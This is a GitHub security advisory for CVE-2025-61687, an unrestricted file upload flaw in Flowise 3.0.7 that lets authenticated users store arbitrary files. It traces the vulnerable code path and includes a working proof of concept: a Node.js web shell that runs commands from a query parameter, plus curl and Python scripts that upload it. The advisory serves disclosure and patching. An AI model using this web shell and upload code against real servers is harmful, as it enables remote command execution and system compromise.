# [H] FlowiseAI/Flosise has File Upload vulnerability

## Summary
Severity: High
Advisory: GHSA-35g6-rrw3-v6xc
CVE: CVE-2025-61687
CWE: CWE-434
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H (CVSS_V3)
Published: 2025-10-08
Source: https://github.com/advisories/GHSA-35g6-rrw3-v6xc
Type: github-advisory

## Affected
- npm: `flowise` — affected >=3.0.7 <3.0.8

## Details
### Summary
A file upload vulnerability in FlowiseAI allows authenticated users to upload arbitrary files without proper validation. This enables attackers to persistently store malicious Node.js web shells on the server, potentially leading to Remote Code Execution (RCE).

### Details
The system fails to validate file extensions, MIME types, or file content during uploads. As a result, malicious scripts such as Node.js-based web shells can be uploaded and stored persistently on the server. These shells expose HTTP endpoints capable of executing arbitrary commands if triggered.

The uploaded shell does not automatically execute, but its presence allows future exploitation via administrator error or chained vulnerabilities.

#### Taint Flow

- **Taint 01: Route Registration**  
  `POST` file requests are routed to the controller via Multer  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/routes/attachments/index.ts#L8

- **Taint 02: Multer Settings**  
  Uploaded files are stored temporarily before further handling  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/utils/index.ts#L1950-L1954

- **Taint 03: Controller**  
  Receives the file from Multer and delegates to the service  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/controllers/attachments/index.ts#L4-L11

- **Taint 04: Service Layer**  
  Processes the file and sends results back to controller  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/services/attachments/index.ts#L7-L16

- **Taint 05: createFileAttachment**  
  Extracts metadata, moves file to permanent storage  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/utils/createAttachment.ts#L118-L126

- **Taint 06: File Save Path**  
  Creates storage directory and saves file  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/components/src/storageUtils.ts#L170-L175  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/components/src/storageUtils.ts#L533-L541

- **Taint 07: File Filtering**  
  Filters dangerous characters in file names but does not reject malicious content  
  https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/components/src/storageUtils.ts#L1104-L1111

### PoC

#### shell.js (Node.js Web Shell)
```js
const { exec } = require('child_process');
const http = require('http');

const server = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://localhost');
    const cmd = url.searchParams.get('cmd');

    if (cmd) {
        console.log(`Executing: ${cmd}`);
        exec(cmd, (error, stdout, stderr) => {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            if (error) {
                res.end(`Error: ${error.message}\n${stderr || ''}`);
            } else {
                res.end(stdout || 'Command executed successfully');
            }
        });
    } else {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end(`
            <h1>Node.js Web Shell</h1>
            <p>Use ?cmd=command to execute</p>
            <p>Example: ?cmd=id</p>
        `);
    }
});

const PORT = 8888;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Shell running on port ${PORT}`);
    console.log(`Access: http://localhost:${PORT}?cmd=id`);
});
```

#### curl Upload
```bash
curl -X POST "http://localhost:3000/api/v1/attachments/0237eefc-18c5-46b2-8b3c-97aa516133fc/$(uuidgen)" \
  -H "Cookie: jwt=ppBk33uGXmJmoj8zIAGgHOP-oQfb2b8yds7XQfqyRl0" \
  -F "files=@shell.js;type=application/javascript"
```

#### Python Upload Script
```python
import requests
import uuid

TARGET_URL = "http://localhost:3000"
CHATFLOW_ID = "0237eefc-18c5-46b2-8b3c-97aa516133fc"
TOKEN = "ppBk33uGXmJmoj8zIAGgHOP-oQfb2b8yds7XQfqyRl0"
CHAT_ID = str(uuid.uuid4())

def upload_shell():
    url = f"{TARGET_URL}/api/v1/attachments/{CHATFLOW_ID}/{CHAT_ID}"
    headers = {'Cookie': f'jwt={TOKEN}'}
    files = {'files': ('shell.js', open('shell.js', 'rb'), 'application/javascript')}
    r = requests.post(url, headers=headers, files=files)

    if r.status_code == 200:
        print("[✓] Upload success")
        print(r.text)
    else:
        print(f"[✗] Upload failed ({r.status_code})")
        print(r.text)

if __name__ == "__main__":
    upload_shell()
```

<img width="1900" height="981" alt="image" src="https://github.com/user-attachments/assets/e0d6a11e-445e-447c-a8f3-c0cb0b9ffb3f" />


### Impact
An attacker can persistently upload and store malicious web shells on the server. If executed, this leads to Remote Code Execution (RCE). The risk increases if administrators unknowingly trigger the shell or if other vulnerabilities are chained to execute the file. This presents a high-severity threat to system integrity and confidentiality.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-35g6-rrw3-v6xc
- https://nvd.nist.gov/vuln/detail/CVE-2025-61687
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/components/src/storageUtils.ts#L1104-L1111
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/components/src/storageUtils.ts#L170-L175
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/components/src/storageUtils.ts#L533-L541
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/controllers/attachments/index.ts#L4-L11
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/routes/attachments/index.ts#L8
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/services/attachments/index.ts#L7-L16
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/utils/createAttachment.ts#L118-L126
- https://github.com/FlowiseAI/Flowise/blob/d29db16bfcf9a4be8febc3d19d52263e8c3d0055/packages/server/src/utils/index.ts#L1950-L1954
